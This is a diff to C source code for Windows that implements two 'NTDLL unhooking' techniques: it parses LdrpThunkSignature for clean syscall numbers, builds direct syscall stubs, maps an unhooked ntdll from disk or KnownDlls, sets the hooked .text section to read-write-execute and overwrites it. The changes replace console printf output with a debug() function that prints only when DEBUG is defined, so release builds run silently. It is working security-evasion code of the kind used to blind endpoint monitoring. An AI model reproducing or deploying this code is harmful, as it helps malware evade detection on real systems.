@@ -130,8 +130,18 @@ RX_NtOpenSection RxNtOpenSection = NULL;
 // Needed for Both Technique - 1 and Technique - 2
 RX_NtMapViewOfSection RxNtMapViewOfSection = NULL;
 
-ULONG_PTR BuildSyscallStub(ULONG_PTR pStubRegion, DWORD dwSyscallNo) {
+void debug(const char *fmt, ...)
+{
+#ifdef DEBUG
+  va_list ap;
+  va_start(ap, fmt);
+  vfprintf(stderr, fmt, ap);
+  va_end(ap);
+#endif
+}
 
+
+ULONG_PTR BuildSyscallStub(ULONG_PTR pStubRegion, DWORD dwSyscallNo) {
 	BYTE bSyscallStub[] = {
 			0x4c, 0x8b, 0xd1,				// mov     r10,rcx
 			0xb8, 0x00, 0x00, 0x00, 0x00,	// mov     eax,xxx
@@ -146,8 +156,7 @@ ULONG_PTR BuildSyscallStub(ULONG_PTR pStubRegion, DWORD dwSyscallNo) {
 }
 
 int InitSyscallsFromLdrpThunkSignature() {
-
-	printf("[*] Parsing LdrpThunkSignature For Clean Syscalls.\n\n");
+	debug("[*] Parsing LdrpThunkSignature For Clean Syscalls.\n\n");
 
 	RX_PEB pPEB = (RX_PEB)__readgsqword(0x60);
 	RX_PEB_LDR_DATA pPEBLdr = pPEB->Ldr;
@@ -162,14 +171,14 @@ int InitSyscallsFromLdrpThunkSignature() {
 	}
 
 	if (pLdeNTDLL == NULL) {
-		printf("[!] Cannot find NTDLL.\n");
+		debug("[!] Cannot find NTDLL.\n");
 		return 0;
 	}
 
 	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLdeNTDLL->DllBase + ((PIMAGE_DOS_HEADER)pLdeNTDLL->DllBase)->e_lfanew);
 	PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader);
 
-	ULONG_PTR DataSectionAddress = NULL;
+	ULONG_PTR DataSectionAddress = (ULONG_PTR)NULL;
 	DWORD DataSectionSize;
 
 	for (WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++) {
@@ -222,20 +231,20 @@ int InitSyscallsFromLdrpThunkSignature() {
 
 	}
 
-	printf("[*] NtOpenFile syscall number..............: %02x\n", dwNtOpenFile);
+	debug("[*] NtOpenFile syscall number..............: %02x\n", dwNtOpenFile);
 
-	printf("[*] NtCreateSection syscall number.........: %02x\n", dwNtCreateSection);
+	debug("[*] NtCreateSection syscall number.........: %02x\n", dwNtCreateSection);
 
-	printf("[*] NtOpenSection syscall number...........: %02x\n", dwNtOpenSection);
+	debug("[*] NtOpenSection syscall number...........: %02x\n", dwNtOpenSection);
 
-	printf("[*] NtMapViewOfSection syscall number......: %02x\n\n", dwNtMapViewOfSection);
+	debug("[*] NtMapViewOfSection syscall number......: %02x\n\n", dwNtMapViewOfSection);
 
 	// Create RX memory region for syscalls stub
 	ULONG_PTR pSyscallRegion = (ULONG_PTR)VirtualAlloc(NULL, 4 * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
 	if (!pSyscallRegion) {
 
-		printf("[!] Cannot allocate memory for syscals stubs.\n");
+		debug("[!] Cannot allocate memory for syscals stubs.\n");
 
 		return 0;
 
@@ -285,14 +294,14 @@ uintptr_t CustomGetProcAddress(void* hModule, const char* wAPIName) {
 		}
 	}
 
-	return NULL;
+	return (uintptr_t) NULL;
 }
 
 // Technique - 1
 // Reads NTDLL From Disk and Clean
 int Technique1() {
 
-	printf("[*] Using Technique-1, Reads NTDLL From Disk and Clean.\n\n");
+	debug("[*] Using Technique-1, Reads NTDLL From Disk and Clean.\n\n");
 
 	NTSTATUS ntStatus;
 
@@ -300,7 +309,7 @@ int Technique1() {
 	HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
 
 	if (hHookedNtdll == NULL) {
-		printf("[-] GetModuleHandleA error: %d\n", GetLastError());
+		debug("[-] GetModuleHandleA error: %d\n", GetLastError());
 		return 0;
 	}
 
@@ -317,51 +326,51 @@ int Technique1() {
 
 	HANDLE hFile = NULL;
 
-	ntStatus = RxNtOpenFile(&hFile, FILE_READ_DATA | GENERIC_READ, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ, NULL);
+	ntStatus = RxNtOpenFile(&hFile, FILE_READ_DATA | GENERIC_READ, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ, (ULONG)0);
 
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtOpenFile error.\n");
+		debug("[-] NtOpenFile error.\n");
 		CloseHandle(hFile);
 		return 0;
 	}
 
-	printf("[*] Clean NTDLL Handle Address.............: 0x%p\n", hFile);
+	debug("[*] Clean NTDLL Handle Address.............: 0x%p\n", hFile);
 
 	HANDLE hSection = NULL;
 
 	ntStatus = RxNtCreateSection(&hSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
 
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtCreateSection error.\n");
+		debug("[-] NtCreateSection error.\n");
 		CloseHandle(hSection);
 		return 0;
 	}
 
-	printf("[*] Clean Section Handle Address...........: 0x%p\n\n", hSection);
+	debug("[*] Clean Section Handle Address...........: 0x%p\n\n", hSection);
 
 	LPVOID pCleanNtdll = NULL;
 	SIZE_T sztViewSize = 0;
 
-	ntStatus = RxNtMapViewOfSection(hSection, NtCurrentProcess(), &pCleanNtdll, NULL, NULL, NULL, &sztViewSize, 1, 0, PAGE_READONLY);
+	ntStatus = RxNtMapViewOfSection(hSection, NtCurrentProcess(), &pCleanNtdll, (ULONG_PTR)NULL, (SIZE_T)NULL, NULL, &sztViewSize, 1, 0, PAGE_READONLY);
 
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtMapViewOfSection error.\n");
+		debug("[-] NtMapViewOfSection error.\n");
 		CloseHandle(hSection);
 		return 0;
 	}
 
-	printf("[*] Clean NTDLL Base Address...............: 0x%p\n", pCleanNtdll);
+	debug("[*] Clean NTDLL Base Address...............: 0x%p\n", pCleanNtdll);
 
 	MODULEINFO miHookedNtdll = {};
 
 	if (GetModuleInformation(NtCurrentProcess(), hHookedNtdll, &miHookedNtdll, sizeof(miHookedNtdll)) == 0) {
-		printf("[-] GetModuleInformation error: %d\n", GetLastError());
+		debug("[-] GetModuleInformation error: %d\n", GetLastError());
 		return 0;
 	}
 
 	// Get base address of hooked NTDLL from MODULEINFO struct
 	LPVOID pHookedBaseAddress = (LPVOID)miHookedNtdll.lpBaseOfDll;
-	printf("[*] Hooked NTDLL Base Address..............: 0x%p\n\n", pHookedBaseAddress);
+	debug("[*] Hooked NTDLL Base Address..............: 0x%p\n\n", pHookedBaseAddress);
 
 	// Get hooked NTDLL DOS header
 	PIMAGE_DOS_HEADER pHookedDosHeader = (PIMAGE_DOS_HEADER)pHookedBaseAddress;
@@ -389,9 +398,9 @@ int Technique1() {
 			// Get size of .TEXT section
 			SIZE_T sztTextSectionSize = pHookedSectionHeader->Misc.VirtualSize;
 
-			printf("[*] Hooked NTDLL .TEXT Section VA..........: 0x%p\n", pHookedTextSectionAddress);
-			printf("[*] Clean NTDLL .TEXT Section VA...........: 0x%p\n\n", pCleanTextStartAddress);
-			printf("[*] Size of .TEXT Section..................: %zd\n", sztTextSectionSize);
+			debug("[*] Hooked NTDLL .TEXT Section VA..........: 0x%p\n", pHookedTextSectionAddress);
+			debug("[*] Clean NTDLL .TEXT Section VA...........: 0x%p\n\n", pCleanTextStartAddress);
+			debug("[*] Size of .TEXT Section..................: %zd\n", sztTextSectionSize);
 
 			// Change original page protection of hooked NTDLL to RWX
 			LPVOID lpBaseAddress = pHookedTextSectionAddress;
@@ -403,7 +412,7 @@ int Technique1() {
 			ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 			if (!NT_SUCCESS(ntStatus)) {
-				printf("[-] NtProtectVirtualMemory - 1: Error.\n");
+				debug("[-] NtProtectVirtualMemory - 1: Error.\n");
 				return 0;
 			}
 
@@ -413,11 +422,11 @@ int Technique1() {
 			// Revert back to original page protections of overwritten NTDLL .TEXT section
 			ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, oldProtection, &oldProtection);
 			if (!NT_SUCCESS(ntStatus)) {
-				printf("[-] NtProtectVirtualMemory - 2: Error.\n");
+				debug("[-] NtProtectVirtualMemory - 2: Error.\n");
 				return 0;
 			}
 
-			printf("\n[+] NTDLL is cleaned. Closing handles...\n\n");
+			debug("\n[+] NTDLL is cleaned. Closing handles...\n\n");
 
 			break;
 
@@ -429,7 +438,7 @@ int Technique1() {
 	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hHookedNtdll, "NtUnmapViewOfSection");
 	ntStatus = NtUnmapViewOfSection(NtCurrentProcess(), pCleanNtdll);
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtUnmapViewOfSection error: %X\n", ntStatus);
+		debug("[-] NtUnmapViewOfSection error: %X\n", ntStatus);
 		return 0;
 	}
 
@@ -439,7 +448,7 @@ int Technique1() {
 	// Close NTDLL disk handle
 	CloseHandle(hFile);
 
-	printf("[+] All done.\n");
+	debug("[+] All done.\n");
 
 	return 1;
 
@@ -449,7 +458,7 @@ int Technique1() {
 // Reads NTDLL From KnownDlls and Clean
 BOOL Technique2() {
 
-	printf("[*] Using Technique-2, Reads NTDLL From KnownDlls and Clean.\n\n");
+	debug("[*] Using Technique-2, Reads NTDLL From KnownDlls and Clean.\n\n");
 
 	NTSTATUS ntStatus;
 
@@ -457,7 +466,7 @@ BOOL Technique2() {
 	HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
 
 	if (hHookedNtdll == NULL) {
-		printf("[-] GetModuleHandleA error: %d\n", GetLastError());
+		debug("[-] GetModuleHandleA error: %d\n", GetLastError());
 		return FALSE;
 	}
 
@@ -477,36 +486,36 @@ BOOL Technique2() {
 	ntStatus = RxNtOpenSection(&hKnownDll, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectAttributes);
 
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtOpenSection error.\n");
+		debug("[-] NtOpenSection error.\n");
 		CloseHandle(hKnownDll);
 		return FALSE;
 	}
 
-	printf("[*] Clean Section Handle Address...........: 0x%p\n\n", hKnownDll);
+	debug("[*] Clean Section Handle Address...........: 0x%p\n\n", hKnownDll);
 
 	LPVOID pCleanNtdll = NULL;
 	SIZE_T sztViewSize = 0;
 
-	ntStatus = RxNtMapViewOfSection(hKnownDll, NtCurrentProcess(), &pCleanNtdll, NULL, NULL, NULL, &sztViewSize, 1, 0, PAGE_READONLY);
+	ntStatus = RxNtMapViewOfSection(hKnownDll, NtCurrentProcess(), &pCleanNtdll, (ULONG_PTR)NULL, (SIZE_T)NULL, NULL, &sztViewSize, 1, 0, PAGE_READONLY);
 
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtMapViewOfSection error.\n");
+		debug("[-] NtMapViewOfSection error.\n");
 		CloseHandle(hKnownDll);
 		return FALSE;
 	}
 
-	printf("[*] Clean NTDLL Base Address...............: 0x%p\n", pCleanNtdll);
+	debug("[*] Clean NTDLL Base Address...............: 0x%p\n", pCleanNtdll);
 
 	MODULEINFO miHookedNtdll = {};
 
 	if (GetModuleInformation(NtCurrentProcess(), hHookedNtdll, &miHookedNtdll, sizeof(miHookedNtdll)) == 0) {
-		printf("[-] GetModuleInformation error: %d\n", GetLastError());
+		debug("[-] GetModuleInformation error: %d\n", GetLastError());
 		return FALSE;
 	}
 
 	// Get base address of hooked NTDLL from MODULEINFO struct
 	LPVOID pHookedBaseAddress = (LPVOID)miHookedNtdll.lpBaseOfDll;
-	printf("[*] Hooked NTDLL Base Address..............: 0x%p\n\n", pHookedBaseAddress);
+	debug("[*] Hooked NTDLL Base Address..............: 0x%p\n\n", pHookedBaseAddress);
 
 	// Get hooked NTDLL DOS header
 	PIMAGE_DOS_HEADER pHookedDosHeader = (PIMAGE_DOS_HEADER)pHookedBaseAddress;
@@ -534,9 +543,9 @@ BOOL Technique2() {
 			// Get size of .TEXT section
 			SIZE_T sztTextSectionSize = pHookedSectionHeader->Misc.VirtualSize;
 
-			printf("[*] Hooked NTDLL .TEXT Section VA..........: 0x%p\n", pHookedTextSectionAddress);
-			printf("[*] Clean NTDLL .TEXT Section VA...........: 0x%p\n\n", pCleanTextStartAddress);
-			printf("[*] Size of .TEXT Section..................: %zd\n", sztTextSectionSize);
+			debug("[*] Hooked NTDLL .TEXT Section VA..........: 0x%p\n", pHookedTextSectionAddress);
+			debug("[*] Clean NTDLL .TEXT Section VA...........: 0x%p\n\n", pCleanTextStartAddress);
+			debug("[*] Size of .TEXT Section..................: %zd\n", sztTextSectionSize);
 
 			// Change original page protection of hooked NTDLL to RWX
 			LPVOID lpBaseAddress = pHookedTextSectionAddress;
@@ -548,7 +557,7 @@ BOOL Technique2() {
 			ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 			if (!NT_SUCCESS(ntStatus)) {
-				printf("[-] NtProtectVirtualMemory - 1: Error.\n");
+				debug("[-] NtProtectVirtualMemory - 1: Error.\n");
 				return FALSE;
 			}
 
@@ -558,11 +567,11 @@ BOOL Technique2() {
 			// Revert back to original page protections of overwritten NTDLL .TEXT section
 			ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, oldProtection, &oldProtection);
 			if (!NT_SUCCESS(ntStatus)) {
-				printf("[-] NtProtectVirtualMemory - 2: Error.\n");
+				debug("[-] NtProtectVirtualMemory - 2: Error.\n");
 				return FALSE;
 			}
 
-			printf("\n[+] NTDLL is cleaned. Closing handles...\n\n");
+			debug("\n[+] NTDLL is cleaned. Closing handles...\n\n");
 
 			break;
 
@@ -574,14 +583,14 @@ BOOL Technique2() {
 	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hHookedNtdll, "NtUnmapViewOfSection");
 	ntStatus = NtUnmapViewOfSection(NtCurrentProcess(), pCleanNtdll);
 	if (!NT_SUCCESS(ntStatus)) {
-		printf("[-] NtUnmapViewOfSection error: %X\n", ntStatus);
+		debug("[-] NtUnmapViewOfSection error: %X\n", ntStatus);
 		return FALSE;
 	}
 
 	// Close KnownDll handle
 	CloseHandle(hKnownDll);
 
-	printf("[+] All done.\n");
+	debug("[+] All done.\n");
 
 	return TRUE;
 
